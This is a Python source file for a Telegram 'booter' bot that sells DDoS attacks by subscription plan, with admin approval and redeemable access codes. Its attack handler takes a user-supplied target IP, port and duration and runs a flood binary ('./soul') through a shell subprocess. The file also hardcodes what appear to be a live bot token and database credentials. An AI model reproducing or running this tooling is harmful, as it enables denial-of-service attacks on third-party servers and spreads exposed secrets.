


import os
import telebot
import asyncio
from pymongo import MongoClient
import logging
import certifi
from dotenv import load_dotenv
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
from datetime import datetime, timedelta

load_dotenv()

TOKEN = "7531145695:AAHtrmu5SJPGsijdBvRnR1Pm7uOEC5BdEoE"
MONGO_URI = "mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal"

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)


client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users
codes_collection = db.codes  

bot = telebot.TeleBot(TOKEN)

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []
REMOTE_HOST = '4.213.71.147'
CHANNEL_ID = -1001934490410
VALID_DURATIONS = [240, 500, 900, 1500]
BOT_OWNER_ID = 1051815609  # Owner ID
def generate_unique_code():
    import random
    import string
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_on_codespace(message, target_ip, target_port, duration):
    command = f"./soul {target_ip} {target_port} {duration} 60"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")
            if "Invalid address/ Address not supported" in error:
                bot.send_message(message.chat.id, "*Bsdk ka shi se bana bot nhi tho ip port shi nhi ha*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

def is_instant_plus_plan(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] == 2:
        return True
    return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = bot.get_chat_member(CHANNEL_ID, user_id).status in ['administrator', 'creator']
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1: 
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2: 
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')


@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP address:*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_ip)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_ip(message):
    try:
        target_ip = message.text
        if not target_ip.replace('.', '').isdigit():
            bot.send_message(message.chat.id, "*Teri maa bana kya ye IP port*")
            return
        bot.send_message(message.chat.id, "*Enter the target port:*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_port, target_ip)
    except Exception as e:
        logging.error(f"Error in processing IP: {e}")

def process_port(message, target_ip):
    try:
        target_port = int(message.text)
        if not (10000 <= target_port <= 30000):
            bot.send_message(message.chat.id, "*Tera se nahi ho ka ddos baap ko bolo vo kara ka ddos.*", parse_mode='Markdown')
            return

        bot.send_message(message.chat.id, "*Enter the duration (240, 500, 900, or 1500 seconds):*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_duration, target_ip, target_port)
    except ValueError:
        bot.send_message(message.chat.id, "*Teri maa bana kya ye IP port*")
    except Exception as e:
        logging.error(f"Error in processing port: {e}")

def process_duration(message, target_ip, target_port):
    try:
        duration = int(message.text)
        if duration not in VALID_DURATIONS:
            bot.send_message(message.chat.id, "*Invalid duration. Please enter one of the following values: 240, 500, 900, 1500.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(message, target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except ValueError:
        bot.send_message(message.chat.id, "*Teri maa bana kya ye IP port*")
    except Exception as e:
        logging.error(f"Error in processing duration: {e}")


@bot.message_handler(commands=['reedom'])
def reedom_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id != BOT_OWNER_ID:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    code = message.text.split()[1] if len(message.text.split()) > 1 else ""
    if not code:
        bot.send_message(chat_id, "*Please provide a code to redeem.*", parse_mode='Markdown')
        return

    code_data = codes_collection.find_one({"code": code})
    if not code_data:
        bot.send_message(chat_id, "*Invalid or expired code.*", parse_mode='Markdown')
        return

    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"plan": 2, "redeemed_code": code}}
    )
    bot.send_message(chat_id, "*Code redeemed successfully. You are now on the Instant++ Plan 💥.*", parse_mode='Markdown')
    codes_collection.delete_one({"code": code})

@bot.message_handler(commands=['gen'])
def gen_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id != BOT_OWNER_ID:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 3:
        bot.send_message(chat_id, "*Invalid command format. Use /gen <howmany> <days>.*", parse_mode='Markdown')
        return

    try:
        howmany = int(cmd_parts[1])
        days = int(cmd_parts[2])
    except ValueError:
        bot.send_message(chat_id, "*Howmany and days must be numbers.*", parse_mode='Markdown')
        return

    if howmany <= 0 or days <= 0:
        bot.send_message(chat_id, "*Howmany and days must be positive numbers.*", parse_mode='Markdown')
        return

    codes = []
    for _ in range(howmany):
        code = generate_unique_code()
        valid_until = (datetime.now() + timedelta(days=days)).isoformat()
        codes_collection.insert_one({"code": code, "valid_until": valid_until})
        codes.append(code)

    codes_list = "\n".join(codes)
    bot.send_message(chat_id, f"*Generated {howmany} codes valid for {days} days each:\n\n{codes_list}*", parse_mode='Markdown')


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    if message.text == "Instant Plan 🧡":
        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
    elif message.text == "Instant++ Plan 💥":
        if is_instant_plus_plan(message.from_user.id):
            attack_command(message)
        else:
            bot.reply_to(message, "*You are not eligible for the Instant++ Plan.*", parse_mode='Markdown')
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "*Please use the following link to download Canary:* [Download Canary](https://example.com)", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_data = users_collection.find_one({"user_id": message.from_user.id})
        if user_data:
            plan = user_data.get('plan', 'Free')
            valid_until = user_data.get('valid_until', 'N/A')
            access_count = user_data.get('access_count', 0)
            bot.send_message(message.chat.id, f"*Plan:* {plan}\n*Valid Until:* {valid_until}\n*Access Count:* {access_count}", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "*No account information found.*", parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.send_message(message.chat.id, "*Please contact admin for assistance.*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.send_message(message.chat.id, "*Please reach out to @admin for support.*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*Invalid option. Please select a valid one from the menu.*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Telegram bot...")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        asyncio.sleep(REQUEST_INTERVAL)
        